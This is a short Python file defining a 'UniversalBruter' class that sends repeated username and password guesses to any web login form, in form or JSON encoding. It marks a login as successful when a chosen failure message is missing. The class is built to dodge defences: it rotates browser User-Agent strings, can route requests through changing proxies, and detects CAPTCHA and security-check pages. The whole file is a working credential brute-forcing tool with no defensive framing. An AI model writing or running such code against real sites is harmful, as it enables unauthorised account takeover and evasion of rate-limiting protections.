import requests
import random

class UniversalBruter:
    def __init__(self, url, user_field, pass_field, username, fail_str):
        self.url = url
        self.user_field = user_field
        self.pass_field = pass_field
        self.username = username
        self.fail_str = fail_str
        self.session = requests.Session()
        self.uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]

    def update_proxy(self, proxy_url):
        self.session.proxies = {"http": proxy_url, "https": proxy_url}

    def attempt(self, password, use_json=False):
        self.session.headers.update({"User-Agent": random.choice(self.uas)})
        payload = {self.user_field: self.username, self.pass_field: password}
        try:
            if use_json:
                r = self.session.post(self.url, json=payload, timeout=10)
            else:
                r = self.session.post(self.url, data=payload, timeout=10)
            
            if any(x in r.text.lower() for x in ["captcha", "robot", "security check"]):
                return "CAPTCHA"
            
            return self.fail_str not in r.text
        except:
            return "ERROR"
